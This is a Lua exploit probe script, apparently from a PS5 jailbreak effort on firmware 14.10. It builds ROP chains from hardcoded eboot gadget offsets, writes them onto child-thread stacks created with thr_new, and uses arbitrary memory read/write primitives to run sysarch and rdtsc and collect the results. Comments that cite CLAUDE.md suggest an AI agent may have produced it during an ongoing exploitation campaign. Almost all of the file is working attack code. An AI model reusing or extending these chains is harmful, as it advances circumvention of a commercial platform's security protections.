-- CRASH_CLASS: MODERATE
-- PROBE 1402a: rdtsc via child thread ROP
--
-- Tests if rdtsc (0F 31) actually works at native resolution on PS5 14.10.
-- Uses thr_new(455) child with ROP chain to execute rdtsc and write result
-- to a shared page, avoiding the fcall_with_rax output corruption.
--
-- ROP chain in child:
--   1. sysarch(SET_FSBASE=129, &fake_tcb)  -- fake TCB for errno
--   2. rdtsc at eboot+0x6A109              -- read TSC
--   3. mov [rdi], rax; ret at eboot+0x92C67 -- write EAX to shared page
--   4. thr_exit(431)
--
-- Bytes at +0x6A109: 0F 31 C0 C3
-- If C0 C3 is "rol bl, imm8" then we need the imm8 byte and whatever follows.
-- Need to verify the full instruction sequence returns cleanly.
-- Alternative: build rdtsc into ROP by jumping to +0x6A109 with stack set so
-- after the eventual ret, we land on mov [rdi], rax; ret.

print("=== 1402a: rdtsc child thread ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function read_byte(base, offset)
    local aligned = offset - (offset % 4)
    local d = safe_rd(base + uint64(aligned))
    if not d then return nil end
    local shift = (offset % 4) * 8
    return math.floor(d / (2 ^ shift)) % 256
end

-- Get eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)
if not text_lo then print("FAIL: no eboot") return end
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo))
print("eboot=" .. string.format("0x%X%08X", text_hi or 0, text_lo))

-- First: decode what's really at +0x6A109 (32 bytes)
print("")
print("=== [A] decode +0x6A109 (32 bytes) ===")
local bytes_str = {}
for i = 0, 31 do
    local b = read_byte(eboot, 0x6A109 + i)
    bytes_str[#bytes_str + 1] = b and string.format("%02X", b) or "??"
end
print(table.concat(bytes_str, " "))
-- Expected: 0F 31 C0 C3 ... → need to see what's after C3

-- Gadget addresses from confirmed catalog
local pop_rax_ret  = eboot + uint64(0x992)     -- pop rax; ret
local pop_rdi_ret  = eboot + uint64(0xC9DFE)   -- pop rdi; ret
local pop_rsi_ret  = eboot + uint64(0xD77D)    -- pop rsi; ret
local pop_rdx_ret  = eboot + uint64(0x3B02D7)  -- pop rdx; ret
local pop_rcx_ret  = eboot + uint64(0xE64)     -- pop rcx; ret
local syscall_ret  = nil  -- need to find syscall;ret or use fn_addr stub
local mov_rdi_rax  = eboot + uint64(0x92C67)   -- mov [rdi], rax; ret
local bare_ret     = eboot + uint64(0x42)       -- ret

-- We need a way to make syscalls from child thread.
-- From CLAUDE.md: child thread ROP uses pop rax → syscall_num, then syscall;ret.
-- But probe 56s says no syscall;ret in eboot. However, child threads CAN make
-- kernel calls via fn_addr (the libkernel syscall stub).
-- Let's get fn_addr from the pipe metadata.
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("fn_addr=" .. (fn_str or "nil"))

-- Parse fn_addr
local fn_addr = nil
if fn_str then
    fn_addr = uint64(fn_str)
end

-- We also need the syscall entry point. From child thread probes (271g, 396f),
-- the child uses: pop rax → syscall_num, then jumps to a "syscall;ret" gadget.
-- But 56s says eboot has none. The child probes use fn_addr as the syscall stub.
-- From the confirmed gadget catalog:
-- "fn_addr stub" IS the syscall entry — pop rax → num, then call fn_addr.
-- Actually, looking at CLAUDE.md more carefully:
-- "RIP = pop rax; ret (eboot+0x992), stack [num][syscall;ret][pop rax][num]..."
-- This implies there IS a syscall;ret being used. Let me check the chain docs.

-- From CLAUDE.md threading docs:
-- "`pop rax; 431; syscall` to exit"
-- This uses thr_exit(431) via the syscall instruction.
-- So the child probes DO use a syscall;ret gadget. Let me find it.
-- The format is: pop rax → 431 → syscall;ret → done
-- 56s says "18 hits of 0F 05 in eboot, all in data/immediates, zero followed by C3"
-- But probe 271g says child CAN make syscalls. How?
--
-- Resolution: the child uses fn_addr (libkernel syscall stub) which is NOT in eboot.
-- fn_addr is in the libkernel data segment (writable, readable).
-- The stub at fn_addr likely does: syscall; ret
-- Let's verify fn_addr is readable and contains 0F 05 C3

if fn_addr then
    local fn_b0 = read_byte(fn_addr, 0)
    local fn_b1 = read_byte(fn_addr, 1)
    local fn_b2 = read_byte(fn_addr, 2)
    print(string.format("fn_addr bytes: %02X %02X %02X",
        fn_b0 or 0xFF, fn_b1 or 0xFF, fn_b2 or 0xFF))
    if fn_b0 == 0x0F and fn_b1 == 0x05 then
        print("fn_addr IS syscall instruction")
        if fn_b2 == 0xC3 then
            print("fn_addr = syscall;ret — PERFECT")
            syscall_ret = fn_addr
        else
            print("fn_addr = syscall but no ret at +2 (byte=" .. string.format("%02X", fn_b2 or 0) .. ")")
            -- Check +3, +4...
            for j = 2, 8 do
                local b = read_byte(fn_addr, j)
                if b == 0xC3 then
                    print("  ret at +" .. j)
                    break
                end
            end
        end
    else
        print("fn_addr is NOT syscall instruction — it's a stub pointer")
        -- fn_addr might be a pointer TO the syscall stub
        local ptr = safe_rq(fn_addr)
        if ptr then
            local ph, pl = get_hi_lo(ptr)
            print(string.format("  *fn_addr = 0x%X%08X", ph, pl))
            -- Read what's at that address
            local sb0 = read_byte(ptr, 0)
            local sb1 = read_byte(ptr, 1)
            local sb2 = read_byte(ptr, 2)
            if sb0 and sb1 then
                print(string.format("  *fn_addr bytes: %02X %02X %02X", sb0, sb1, sb2 or 0xFF))
            end
        end
    end
end

-- ============================================================
-- [B] Shared memory for child result
-- ============================================================
print("")
print("=== [B] shared memory ===")

local sc_mmap = make_syscall(477)
local shared = nil
do
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        local h, l = get_hi_lo(v)
        if h ~= 0xFFFF then shared = v end
    end
end

if not shared then print("FAIL: mmap") return end
local sh, sl = get_hi_lo(shared)
print(string.format("shared page: 0x%X%08X", sh, sl))

-- Write sentinel
safe_wq(shared, uint64(0xDEAD))
safe_wq(shared + 8, uint64(0xDEAD))
safe_wq(shared + 16, uint64(0xDEAD))

-- ============================================================
-- [C] Simple child test — just write a marker via mov [rdi], rax; ret
-- ============================================================
print("")
print("=== [C] child write test ===")

-- Allocate stack for child (64KB)
local STACK_SIZE = 0x10000
local child_stack = nil
do
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        local h, l = get_hi_lo(v)
        if h ~= 0xFFFF then child_stack = v end
    end
end

if not child_stack then print("FAIL: stack mmap") return end

-- Fake TCB for sysarch (prevents errno crash)
local fake_tcb = memory.alloc(0x1000)
-- Self-referencing pointer at +0x00
safe_wq(fake_tcb, fake_tcb)
-- Fill rest with self-ref too
for i = 8, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end

-- thr_param struct (0x38 bytes)
local thr_param = memory.alloc(0x40)

-- Build ROP chain on child stack
-- RSP starts at (stack_base + stack_size) & ~0xF - 8
local stack_top_val = child_stack + uint64(STACK_SIZE)
-- Align
local sth, stl = get_hi_lo(stack_top_val)
stl = math.floor(stl / 16) * 16 - 8
local child_rsp = uint64(string.format("0x%X%08X", sth, stl))

-- Simple test: pop rdi → shared; pop rax → 0xCAFEBABE; mov [rdi],rax; ret; thr_exit
-- This just writes 0xCAFEBABE to shared page to confirm child works

local rsp = child_rsp
local chain = {}

-- sysarch(SET_FSBASE=129, &fake_tcb) to fix errno access
-- pop rax; ret → 165 (sysarch syscall)
chain[#chain+1] = {pop_rax_ret}
chain[#chain+1] = {uint64(165)}
-- pop rdi; ret → 129 (SET_FSBASE)
chain[#chain+1] = {pop_rdi_ret}
chain[#chain+1] = {uint64(129)}
-- pop rsi; ret → &fake_tcb_ptr (pointer TO the pointer)
local tcb_ptr = memory.alloc(8)
safe_wq(tcb_ptr, fake_tcb)
chain[#chain+1] = {pop_rsi_ret}
chain[#chain+1] = {uint64(tcb_ptr)}
-- syscall;ret (fn_addr if available)
if syscall_ret then
    chain[#chain+1] = {syscall_ret}
else
    -- Try fn_addr directly
    if fn_addr then
        chain[#chain+1] = {fn_addr}
    else
        print("NO syscall gadget — skip sysarch")
        chain = {}
    end
end

-- pop rdi → shared page address
chain[#chain+1] = {pop_rdi_ret}
chain[#chain+1] = {shared}
-- pop rax → 0xCAFEBABE marker
chain[#chain+1] = {pop_rax_ret}
chain[#chain+1] = {uint64(0xCAFEBABE)}
-- mov [rdi], rax; ret → write marker
chain[#chain+1] = {mov_rdi_rax}

-- thr_exit(431)
chain[#chain+1] = {pop_rax_ret}
chain[#chain+1] = {uint64(431)}
chain[#chain+1] = {pop_rdi_ret}
chain[#chain+1] = {uint64(0)}
if syscall_ret then
    chain[#chain+1] = {syscall_ret}
elseif fn_addr then
    chain[#chain+1] = {fn_addr}
end

-- Write chain to stack
print("chain length: " .. #chain .. " entries")
local cur = child_rsp
for i, entry in ipairs(chain) do
    safe_wq(cur, entry[1])
    cur = cur + 8
end

-- Set up thr_param
-- +0x00: start_func → pop rax; ret (first gadget)
safe_wq(thr_param, pop_rax_ret)
-- +0x08: arg → not used (rdi set by pop rdi in chain)
safe_wq(thr_param + 8, uint64(0))
-- +0x10: stack_base
safe_wq(thr_param + 0x10, child_stack)
-- +0x18: stack_size
safe_wq(thr_param + 0x18, uint64(STACK_SIZE))
-- +0x30: child_tid pointer (optional)
local child_tid = memory.alloc(8)
safe_wq(child_tid, uint64(0))
safe_wq(thr_param + 0x30, uint64(child_tid))

-- But wait — thr_new(455) calls start_func(arg) where arg is in rdi.
-- The start_func gets called, not ret'd into. So start_func must be
-- a real function entry. For ROP, we use a gadget as start_func and
-- set up the stack with the ROP chain.
--
-- thr_new starts at start_func with RSP pointing to the stack.
-- Actually, the kernel sets RSP = stack_base + stack_size (aligned),
-- and RIP = start_func, RDI = arg.
--
-- For ROP: start_func = pop rdi; ret (to set up rdi from stack)
-- But actually, start_func is CALLED, meaning the kernel pushes a
-- return address. Unless thr_new just sets RIP directly.
--
-- From CLAUDE.md: "RSP = ((stack_base + stack_size) & ~0xF) - 8"
-- So RSP is set to a specific value, and RIP = start_func.
-- There's no "call" — the kernel directly sets registers.
-- So start_func IS the first address executed, and [RSP] is the
-- first stack entry (return address for the first ret).
--
-- So I need: RIP = ret (bare_ret), and the stack starts with the chain.
-- Or: RIP = pop_rax_ret, stack starts with [value_for_rax, next_gadget, ...]

-- Fix: start_func should be the first gadget (pop_rax_ret),
-- and the stack should already contain the chain values.
-- RSP points to child_rsp, first qword on stack is the value for rax.

-- Actually the issue is: thr_new sets RIP = start_func and RDI = arg.
-- If start_func = pop_rax_ret, then:
--   CPU executes: pop rax ← reads [RSP], RSP += 8
--   then ret ← reads [RSP], jumps there, RSP += 8
-- So [child_rsp+0] = value for rax (first pop)
-- [child_rsp+8] = address to ret to (next gadget)
-- etc.

-- But I wrote the chain starting at child_rsp. The first entry IS
-- pop_rax_ret, but that's wrong — that's on the STACK, not in RIP.
-- Let me fix: set start_func to the first gadget, and the stack
-- contains the ARGUMENTS to those gadgets.

-- Rewrite chain on stack
-- RIP = pop_rax_ret
-- Stack:
--   [0]  = 165 (sysarch syscall num for rax)
--   [8]  = fn_addr (syscall;ret — ret from sysarch)
--   ... but wait, after pop rax → 165, the ret goes to fn_addr
--   fn_addr does syscall, but rdi isn't set yet!

-- Need proper ordering. For sysarch(129, &tcb_ptr):
-- rax = 165, rdi = 129, rsi = &tcb_ptr_buf, then syscall;ret

-- Let me rebuild properly.
-- RIP = pop_rdi_ret → set rdi = 129
-- Stack:
--   [0] = 129
--   [8] = pop_rsi_ret
--   [16] = tcb_ptr
--   [24] = pop_rax_ret
--   [32] = 165
--   [40] = fn_addr (or syscall;ret)
--   [48] = pop_rdi_ret  ← after sysarch returns
--   [56] = shared page addr
--   [64] = pop_rax_ret
--   [72] = 0xCAFEBABE
--   [80] = mov_rdi_rax
--   [88] = pop_rax_ret
--   [96] = 431
--   [104] = pop_rdi_ret
--   [112] = 0
--   [120] = fn_addr

local stack_entries = {}
-- sysarch(SET_FSBASE=129, &tcb_ptr)
stack_entries[#stack_entries+1] = uint64(129)        -- rdi = 129
stack_entries[#stack_entries+1] = pop_rsi_ret
stack_entries[#stack_entries+1] = uint64(tcb_ptr)    -- rsi = &tcb_ptr
stack_entries[#stack_entries+1] = pop_rax_ret
stack_entries[#stack_entries+1] = uint64(165)         -- rax = 165 (sysarch)
if fn_addr then
    stack_entries[#stack_entries+1] = fn_addr          -- syscall;ret
else
    print("FAIL: no fn_addr")
    return
end

-- Write marker to shared page
stack_entries[#stack_entries+1] = pop_rdi_ret
stack_entries[#stack_entries+1] = shared              -- rdi = shared
stack_entries[#stack_entries+1] = pop_rax_ret
stack_entries[#stack_entries+1] = uint64(0xCAFEBABE)  -- rax = marker
stack_entries[#stack_entries+1] = mov_rdi_rax          -- [rdi] = rax

-- thr_exit(431)
stack_entries[#stack_entries+1] = pop_rax_ret
stack_entries[#stack_entries+1] = uint64(431)
stack_entries[#stack_entries+1] = pop_rdi_ret
stack_entries[#stack_entries+1] = uint64(0)
stack_entries[#stack_entries+1] = fn_addr

-- Write to stack
for i, val in ipairs(stack_entries) do
    safe_wq(child_rsp + (i - 1) * 8, val)
end
print("stack entries: " .. #stack_entries)

-- Set thr_param
safe_wq(thr_param, pop_rdi_ret)       -- start_func = pop rdi; ret
safe_wq(thr_param + 8, uint64(0))     -- arg (unused — rdi set by chain)
safe_wq(thr_param + 0x10, child_stack)
safe_wq(thr_param + 0x18, uint64(STACK_SIZE))
safe_wq(thr_param + 0x30, uint64(child_tid))

-- Launch child
local sc_thr_new = make_syscall(455)
local ok, ret = pcall(function()
    return sc_thr_new(uint64(thr_param), uint64(0x38))
end)

if ok then
    local _, rv = get_hi_lo(ret)
    print("thr_new ret=" .. rv)
else
    print("thr_new FAIL")
end

-- Wait for child (sleep 100ms via nanosleep)
local sc_nanosleep = make_syscall(240)
local sleep_ts = memory.alloc(16)
safe_wq(sleep_ts, uint64(0))         -- seconds
safe_wq(sleep_ts + 8, uint64(100000000))  -- 100ms in ns
pcall(function() sc_nanosleep(uint64(sleep_ts), uint64(0)) end)

-- Read result
local result = safe_rq(shared)
if result then
    local rh, rl = get_hi_lo(result)
    print(string.format("shared[0] = 0x%X%08X", rh, rl))
    if rl == 0xCAFEBABE and rh == 0 then
        print("CHILD WRITE CONFIRMED")
    elseif rh == 0 and rl == 0xDEAD then
        print("sentinel unchanged — child didn't write")
    else
        print("unexpected value")
    end
else
    print("read failed")
end

-- ============================================================
-- [D] If child works, test rdtsc from child
-- ============================================================
print("")
print("=== [D] rdtsc from child ===")

-- Reset sentinel
safe_wq(shared, uint64(0xDEAD1111))
safe_wq(shared + 8, uint64(0xDEAD2222))

-- New stack for rdtsc child
local child_stack2 = nil
do
    local ok2, v = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok2 then
        local h, l = get_hi_lo(v)
        if h ~= 0xFFFF then child_stack2 = v end
    end
end
if not child_stack2 then print("FAIL: stack2 mmap") return end

local st2 = child_stack2 + uint64(STACK_SIZE)
local s2h, s2l = get_hi_lo(st2)
s2l = math.floor(s2l / 16) * 16 - 8
local child_rsp2 = uint64(string.format("0x%X%08X", s2h, s2l))

-- rdtsc gadget at eboot+0x6A109: bytes 0F 31 C0 C3
-- If this is truly rdtsc + rol bl, imm8 + more code that eventually rets,
-- then after execution, EAX = TSC_lo. We need to store it.
--
-- Strategy: jump to rdtsc gadget. If it returns cleanly, rax has TSC.
-- Then mov [rdi], rax; ret stores it.
--
-- But we don't know if +0x6A109 returns. Let's try anyway.
-- If it crashes, the child dies and sentinel stays.

local rdtsc_addr = eboot + uint64(0x6A109)

local stack2 = {}
-- sysarch first
stack2[#stack2+1] = uint64(129)
stack2[#stack2+1] = pop_rsi_ret
stack2[#stack2+1] = uint64(tcb_ptr)
stack2[#stack2+1] = pop_rax_ret
stack2[#stack2+1] = uint64(165)
stack2[#stack2+1] = fn_addr

-- Set rdi = shared page (for storing result)
stack2[#stack2+1] = pop_rdi_ret
stack2[#stack2+1] = shared

-- Jump to rdtsc gadget
-- After rdtsc, EAX = TSC_lo, EDX = TSC_hi
-- If the gadget returns cleanly (eventually hits C3), rax still has TSC_lo
-- Then: mov [rdi], rax; ret stores it
stack2[#stack2+1] = rdtsc_addr

-- After rdtsc returns (if it does): store rax
stack2[#stack2+1] = mov_rdi_rax

-- Store EDX (TSC_hi) to shared+8
-- Need: mov [rdi+8], rdx or similar. We don't have that gadget.
-- Alternative: rdi += 8, then store again... but rax might be clobbered.
-- Skip TSC_hi for now — TSC_lo is enough to test.

-- thr_exit
stack2[#stack2+1] = pop_rax_ret
stack2[#stack2+1] = uint64(431)
stack2[#stack2+1] = pop_rdi_ret
stack2[#stack2+1] = uint64(0)
stack2[#stack2+1] = fn_addr

for i, val in ipairs(stack2) do
    safe_wq(child_rsp2 + (i - 1) * 8, val)
end

-- thr_param for child 2
local thr_param2 = memory.alloc(0x40)
safe_wq(thr_param2, pop_rdi_ret)
safe_wq(thr_param2 + 8, uint64(0))
safe_wq(thr_param2 + 0x10, child_stack2)
safe_wq(thr_param2 + 0x18, uint64(STACK_SIZE))
local child_tid2 = memory.alloc(8)
safe_wq(child_tid2, uint64(0))
safe_wq(thr_param2 + 0x30, uint64(child_tid2))

local ok2, ret2 = pcall(function()
    return sc_thr_new(uint64(thr_param2), uint64(0x38))
end)
if ok2 then
    local _, rv = get_hi_lo(ret2)
    print("thr_new rdtsc child ret=" .. rv)
else
    print("thr_new FAIL")
end

-- Wait
pcall(function() sc_nanosleep(uint64(sleep_ts), uint64(0)) end)

-- Read rdtsc result
local tsc1 = safe_rq(shared)
if tsc1 then
    local th, tl = get_hi_lo(tsc1)
    print(string.format("TSC reading 1: 0x%X%08X", th, tl))
    if tl == 0xDEAD1111 and th == 0 then
        print("sentinel unchanged — rdtsc child crashed or didn't write")
    elseif th == 0 and tl == 0 then
        print("zero — rdtsc might be intercepted or gadget clobbered rax")
    else
        print("GOT A VALUE — rdtsc may work!")
    end
else
    print("read failed")
end

-- Try a second rdtsc child for delta measurement
safe_wq(shared + 8, uint64(0xDEAD3333))

local child_stack3 = nil
do
    local ok3, v = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok3 then
        local h, l = get_hi_lo(v)
        if h ~= 0xFFFF then child_stack3 = v end
    end
end

if child_stack3 then
    local st3 = child_stack3 + uint64(STACK_SIZE)
    local s3h, s3l = get_hi_lo(st3)
    s3l = math.floor(s3l / 16) * 16 - 8
    local child_rsp3 = uint64(string.format("0x%X%08X", s3h, s3l))

    -- Same chain but write to shared+8
    local stack3 = {}
    stack3[#stack3+1] = uint64(129)
    stack3[#stack3+1] = pop_rsi_ret
    stack3[#stack3+1] = uint64(tcb_ptr)
    stack3[#stack3+1] = pop_rax_ret
    stack3[#stack3+1] = uint64(165)
    stack3[#stack3+1] = fn_addr
    stack3[#stack3+1] = pop_rdi_ret
    stack3[#stack3+1] = shared + 8  -- write to +8
    stack3[#stack3+1] = rdtsc_addr
    stack3[#stack3+1] = mov_rdi_rax
    stack3[#stack3+1] = pop_rax_ret
    stack3[#stack3+1] = uint64(431)
    stack3[#stack3+1] = pop_rdi_ret
    stack3[#stack3+1] = uint64(0)
    stack3[#stack3+1] = fn_addr

    for i, val in ipairs(stack3) do
        safe_wq(child_rsp3 + (i - 1) * 8, val)
    end

    local thr_param3 = memory.alloc(0x40)
    safe_wq(thr_param3, pop_rdi_ret)
    safe_wq(thr_param3 + 8, uint64(0))
    safe_wq(thr_param3 + 0x10, child_stack3)
    safe_wq(thr_param3 + 0x18, uint64(STACK_SIZE))
    local child_tid3 = memory.alloc(8)
    safe_wq(child_tid3, uint64(0))
    safe_wq(thr_param3 + 0x30, uint64(child_tid3))

    pcall(function() sc_thr_new(uint64(thr_param3), uint64(0x38)) end)
    pcall(function() sc_nanosleep(uint64(sleep_ts), uint64(0)) end)

    local tsc2 = safe_rq(shared + 8)
    if tsc2 then
        local t2h, t2l = get_hi_lo(tsc2)
        print(string.format("TSC reading 2: 0x%X%08X", t2h, t2l))

        if tsc1 and tsc2 then
            local _, t1l = get_hi_lo(tsc1)
            local d = t2l - t1l
            if d < 0 then d = d + 0x100000000 end
            print(string.format("TSC delta: %d cycles (~%d us at 3.5GHz)",
                d, math.floor(d / 3500)))
        end
    end
end

print("")
print("=== 1402a DONE ===")
